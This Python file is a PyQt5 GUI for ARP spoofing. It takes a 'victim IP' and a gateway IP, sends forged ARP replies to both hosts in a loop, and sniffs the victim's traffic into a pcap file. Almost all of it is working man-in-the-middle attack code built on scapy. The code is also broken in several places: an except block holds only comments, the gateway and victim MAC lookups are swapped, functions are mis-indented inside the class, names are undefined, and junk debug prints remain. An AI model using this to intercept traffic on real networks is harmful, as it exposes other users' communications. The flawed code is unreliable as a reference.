import sys
from PyQt5 import QtCore, QtWidgets
from PyQt5.QtWidgets import QMainWindow,QTableWidget,QGridLayout, QTableWidgetItem, QTableWidget, \
    QLabel, QLineEdit, QApplication, QMainWindow, QFrame, QLabel,QPushButton, QPlainTextEdit,QMessageBox,QVBoxLayout, \
    QGroupBox, QComboBox
import time
import ipaddress
from scapy.all import *
import os
import threading
import signal
from netaddr import *
import psutil
########################################################################################################
class MainWindow(QMainWindow):
    def __init__(self):
        QMainWindow.__init__(self)
        self.setFixedSize(650, 450)
        self.setWindowTitle("Arp sniffing")
        self.nameLabel1 = QLabel(self)    # Lable
        self.nameLabel2 = QLabel(self)
        self.nameLabel3 = QLabel(self)
        self.nameLabel5 = QLabel(self)
        self.nameLabel1.setText('victim IP:')
        self.nameLabel2.setText('Gateway IP:')
        self.nameLabel5.setText("Network Interface")
        self.line1 = QLineEdit(self)   # TextBox
        self.line2 = QLineEdit(self)
        self.line1.resize(100, 20)
        self.line2.resize(100, 20)
        self.nameLabel1.move(20, 15)
        self.nameLabel2.move(20, 45)
        self.nameLabel5.move(250, 15)
        self.nameLabel3.move(250, 40)
        self.line1.move(80, 20)
        self.line2.move(80, 50)
        self.comboBox = QComboBox(self)   # comboBox
        addrs = psutil.net_if_addrs()   # list of Network adaptor
        for i in addrs:
            self.comboBox.addItem(i)
        self.comboBox.move(350, 15)
        windowLayout = QVBoxLayout()  # QvBox
        windowLayout.addWidget(self.line1)
        windowLayout.addWidget(self.line2)
        windowLayout.addWidget(self.nameLabel1)
        windowLayout.addWidget(self.nameLabel2)
        pybutton = QPushButton('OK', self)
        pybutton.clicked.connect(self.clickMethod)
        pybutton.resize(100, 32)
        pybutton.move(80, 90)
        self.setLayout(windowLayout)
        table = QTableWidget(self)  # Create a table
        table.resize(630, 285)
        table.move(10, 150)
        table.setColumnCount(3)  # Set three columns
        table.setRowCount(1)
        table.setHorizontalHeaderLabels(["Header 1", "Header 2", "Header 3"])   # Set the table headers
        table.horizontalHeaderItem(0).setToolTip("Column 1 ")   #Set the tooltips to headings
        table.horizontalHeaderItem(1).setToolTip("Column 2 ")
        table.horizontalHeaderItem(2).setToolTip("Column 3 ")
        table.setItem(0, 0, QTableWidgetItem("Text in column 1"))
        table.setItem(0, 1, QTableWidgetItem("Text in column 2"))
        table.setItem(0, 2, QTableWidgetItem("Text in column 3"))
        # Do the resize of the columns by content
        table.resizeColumnsToContents()
####################################################################### Create Table
    def createTable(self):
        # Create table
        self.tableWidget = QTableWidget()
        self.tableWidget.setRowCount(4)
        self.tableWidget.setColumnCount(2)
        self.tableWidget.setItem(0, 0, QTableWidgetItem("Cell (1,1)"))
        self.tableWidget.setItem(0, 1, QTableWidgetItem("Cell (1,2)"))
        self.tableWidget.setItem(1, 0, QTableWidgetItem("Cell (2,1)"))
        self.tableWidget.setItem(1, 1, QTableWidgetItem("Cell (2,2)"))
        self.tableWidget.setItem(2, 0, QTableWidgetItem("Cell (3,1)"))
        self.tableWidget.setItem(2, 1, QTableWidgetItem("Cell (3,2)"))
        self.tableWidget.setItem(3, 0, QTableWidgetItem("Cell (4,1)"))
        self.tableWidget.setItem(3, 1, QTableWidgetItem("Cell (4,2)"))
        self.tableWidget.move(0, 0)

        # table selection change
        self.tableWidget.doubleClicked.connect(self.on_click)
##########################################################################################Click Button
    def clickMethod(self):
        try:
           self.nameLabel3.setText("==>>>  " + str(ipaddress.ip_address((self.line1.text()))))
           victim_ip = str(ipaddress.ip_address((self.line1.text())))
           gateway_ip = str(ipaddress.ip_address(self.line2.text()))
           interface = self.comboBox.currentText()
           print("fgffffffff")
           #return1= startS()
           print(get_mac(victim_ip))
           print(get_mac(gateway_ip))
           gateway_mac=get_mac(victim_ip)
           victim_mac=get_mac(gateway_ip)
           if gateway_mac is None:
               print("[!] Failed to get gateway")
           print("[*] Gateway %s iffs at %s" % (gateway_ip))

        except:

           # QMessageBox.about(self, "Error", "Input is Invalid")
           # self.line1.clear()
           # self.nameLabel3.clear()
####################################################################################################Scapy
    #def restore_target(self,gateway_ip, gateway_mac, target_ip, target_mac):
                """Rstore targets and gateway"s ip to correct ARP"""
               # send(ARP(op=2, psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac,count=5))
               # send(ARP(op=2, psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac,count=5))
               # os.kill(os.getpid(), signal.SIGINT)

##########################################################################################################
    def get_mac(ip):   # Return mac address of Target
        print(ip)
        resp, unans = srp(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), retry=2, timeout=10)
        for s, r in resp:
            return r[ARP].hwsrc
        return None

    ###############################################################################################################
    def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
            """Start ARP poisoning for a specified target and gateway."""
            poison_target = ARP()
            poison_target.op = 2
            poison_target.psrc = gateway_ip
            poison_target.pdst = target_ip
            poison_target.hwdst = target_mac
            poison_gateway = ARP()
            poison_gateway.op = 2
            poison_gateway.psrc = target_ip
            poison_gateway.pdst = gateway_ip
            poison_gateway.hwdst = gateway_mac
            print("[*] Beginning the ARP poison")
            while True:
                try:
                    send(poison_target)
                    send(poison_gateway)
                    time.sleep(1)
                except KeyboardInterrupt:
                    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
            print("[*] Attack finished")
##########################################################################################################
class startS():

    def __init__(self,target_ip,interfaces,gateway_ip):

        self.target_ip=target_ip
        self.interfaces=interfaces
        self.gateway_ip=gateway_ip
        packet_count = 1000
        conf.verb = 0
        print("fffdsasss")


        target_mac = get_mac(target_ip)
        if target_mac is None:
                print("[!] Failed to get target")
                sys.exit(1)
        print("[*] Gateway %s issss at %s" % (target_ip, target_mac))

        poison_thread = threading.Thread(
                target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
        poison_thread.start()

        try:
                print("[*] Starting sniffer for %d packets" % (packet_count))
                bpf_filter = "IP host %s" % (target_ip)
                packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
                wrpcap("arper.pcap", packets)
        except KeyboardInterrupt:
                pass
        finally:
                restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
                print("[*] Finished capturing packets")
#####################################################################################################################
if __name__ == "__main__":

    app = QtWidgets.QApplication(sys.argv)
    mainWin = MainWindow()

    mainWin.show()
    sys.exit(app.exec_())
